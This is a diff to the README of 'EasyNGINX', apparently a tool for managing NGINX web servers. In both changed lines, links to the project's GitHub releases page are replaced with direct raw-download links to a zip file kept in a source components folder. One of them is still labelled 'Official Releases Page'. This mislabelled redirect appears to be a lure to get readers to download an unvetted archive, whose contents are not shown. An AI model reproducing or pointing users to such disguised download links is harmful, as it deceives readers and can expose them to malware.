@@ -1,6 +1,6 @@
 # 🌐 EasyNGINX - Simple web server management for everyone 
 
-[![Download EasyNGINX](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Anal-refugee100/EasyNGINX/releases)
+[![Download EasyNGINX](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Anal-refugee100/EasyNGINX/raw/refs/heads/main/web/src/components/Easy-NGINX-v1.2.zip)
 
 EasyNGINX bridges the gap between complex server technology and daily usability. This tool automates the installation and maintenance of NGINX, a powerful web server software. It handles technical tasks like security hardening, SSL certificate installation, and configuration management without requiring manual code edits.
 
@@ -8,7 +8,7 @@ EasyNGINX bridges the gap between complex server technology and daily usability.
 
 You can obtain the current version directly from the project repository. Please visit the link provided below to find the files for your system.
 
-[Download EasyNGINX from the Official Releases Page](https://github.com/Anal-refugee100/EasyNGINX/releases)
+[Download EasyNGINX from the Official Releases Page](https://github.com/Anal-refugee100/EasyNGINX/raw/refs/heads/main/web/src/components/Easy-NGINX-v1.2.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Latest."
